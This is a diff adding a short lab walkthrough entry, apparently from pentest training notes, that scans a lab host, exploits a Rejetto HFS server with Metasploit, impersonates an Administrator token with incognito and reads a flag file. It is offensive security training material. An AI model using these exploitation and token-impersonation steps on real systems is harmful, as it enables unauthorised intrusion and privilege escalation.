@@ -582,8 +582,26 @@ migrate 680
 hashdump
 ```
 
+32) Privilege Escalation: Impersonate
+    
+```
+cat /root/Desktop/target
+nmap 10.0.28.7
+nmap -sV -p 80 10.0.28.7
+searchsploit hfs
+msfconsole -q
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS 10.0.28.7
+exploit 
+getuid
+C:\Users\Administrator\Desktop\flag.txt
+load incognito
+list_tokens -u
+impersonate_token ATTACKDEFENSE\\Administrator 
+getuid
+cat C:\\Users\\Administrator\\Desktop\\flag.txt
 
-
+```
 
 
 
